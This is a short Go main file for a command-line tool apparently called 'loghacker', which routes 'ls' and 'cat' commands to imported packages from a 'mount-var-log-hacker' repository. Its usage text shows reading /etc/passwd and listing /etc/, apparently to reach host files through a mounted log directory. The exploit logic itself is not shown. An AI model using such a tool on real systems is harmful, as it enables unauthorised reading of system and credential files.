package main

import (
	"fmt"
	"os"

	"github.com/awslshadowstar/mount-var-log-hacker/pkg/logcat"
	"github.com/awslshadowstar/mount-var-log-hacker/pkg/logls"
)

func main() {
	if len(os.Args) < 3 {
		usage()
		return
	}
	switch os.Args[1] {
	case "ls":
		if err := logls.DolsWrapperDefault(os.Args[2]); err != nil {
			fmt.Println(err)
		}
	case "cat":
		if err := logcat.DocatWrapperDefault(os.Args[2]); err != nil {
			fmt.Println(err)
		}
	default:
		usage()
	}
}

func usage() {
	fmt.Println("usage: e.g.")
	fmt.Println("loghacker cat /etc/passwd")
	fmt.Println("loghacker ls /etc/")
}
